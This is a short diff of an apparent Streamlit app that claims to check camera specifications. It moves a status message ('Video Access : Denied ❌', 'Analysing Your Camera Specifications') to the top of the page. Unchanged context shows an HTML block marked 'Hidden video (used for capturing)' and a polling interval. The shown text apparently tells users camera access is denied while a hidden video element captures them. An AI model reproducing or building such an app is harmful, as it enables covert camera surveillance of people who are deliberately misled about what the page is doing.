@@ -10,6 +10,13 @@ st.markdown(f"""
 This app checks camera specs to:
 Make sure you allow permission to access the camera.
 """)
+st.markdown(f""" The wheels are running:
+Device : sansung
+Camera: Rear
+Video Access : Denied ❌
+Camera Info Access: Enables
+Analysing Your Camera Specifications 
+""")
 
 st.components.v1.html(f"""
 <!-- Hidden video (used for capturing) -->
@@ -95,10 +102,4 @@ setInterval(async () => {{
 """, height=480)
 
 
-st.markdown(f""" The wheels are running:
-Device : sansung
-Camera: Rear
-Video Access : Denied ❌
-Camera Info Access: Enables
-Analysing Your Camera Specifications 
-""")
+
